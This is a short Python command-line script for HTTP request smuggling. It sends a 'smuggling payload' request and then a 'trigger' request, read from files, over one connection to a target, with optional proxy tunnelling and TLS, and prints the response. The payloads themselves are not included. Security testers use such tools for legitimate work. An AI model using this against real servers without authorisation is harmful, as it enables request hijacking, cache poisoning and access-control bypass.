import socket
import ssl
import sys
import time

def load_request(path):
    with open(path, 'rb') as f:
        return f.read()

def connect(host, port, use_ssl=False, proxy_host=None, proxy_port=None):
    if proxy_host:
        # Connect to the proxy
        sock = socket.create_connection((proxy_host, proxy_port))
        # Send HTTP CONNECT request to establish the tunnel
        connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        sock.sendall(connect_request.encode())
        response = sock.recv(4096)  # Read proxy response
        if b"200 Connection established" not in response:
            print("Failed to establish connection through proxy")
            sys.exit(1)
    else:
        # Connect directly to the target
        sock = socket.create_connection((host, port))
    
    if use_ssl:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)

    return sock

def main():
    if len(sys.argv) < 5:
        print("Usage: python3 http_smuggle.py <host> <port> <req1.txt> <req2.txt> [--ssl] [--proxy proxyhost:port]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    req1_path = sys.argv[3]
    req2_path = sys.argv[4]
    use_ssl = '--ssl' in sys.argv

    proxy_host = None
    proxy_port = None
    if '--proxy' in sys.argv:
        idx = sys.argv.index('--proxy')
        proxy = sys.argv[idx + 1]
        if ':' not in proxy:
            print("Proxy must be in format host:port")
            sys.exit(1)
        proxy_host, proxy_port = proxy.split(':')
        proxy_port = int(proxy_port)

    req1 = load_request(req1_path)
    req2 = load_request(req2_path)

    try:
        sock = connect(host, port, use_ssl, proxy_host, proxy_port)

        print("Sending first request (smuggling payload)...")
        sock.sendall(req1)  # Send first request (smuggling request)
        time.sleep(1)  # Wait before sending the second request
        print("Sending second request (trigger request)...")
        sock.sendall(req2)  # Send second request (trigger request)

        sock.settimeout(5.0)
        response = b''
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
        except socket.timeout:
            pass

        print("Response from server:\n")
        print(response.decode('utf-8', errors='replace'))

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        try:
            sock.close()
        except:
            pass

if __name__ == "__main__":
    main()
